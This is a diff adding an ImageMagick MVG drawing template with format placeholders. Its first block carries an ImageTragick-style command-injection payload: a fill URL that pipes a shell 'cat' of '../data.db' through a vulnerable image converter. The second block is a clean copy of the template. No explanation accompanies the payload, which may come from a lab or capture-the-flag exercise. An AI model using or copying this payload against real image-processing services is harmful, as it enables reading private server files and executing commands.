@@ -1,0 +1,23 @@
+push graphic-context
+viewbox 0 0 640 320
+image Add 0,0,640,320 'out.png'
+push graphic-context
+        font-size 40
+        fill 'black'
+        stroke-width 1
+        text 0,300 '%s'
+fill 'url(https://example.com/image.jpg"|cat "../data.db)'
+pop graphic-context
+pop graphic-context
+
+
+push graphic-context
+viewbox 0 0 640 320
+image Add 0,0,640,320 '%s'
+push graphic-context
+        font-size 40
+        fill 'black'
+        stroke-width 1
+        text 0,300 '%s'
+pop graphic-context
+pop graphic-context
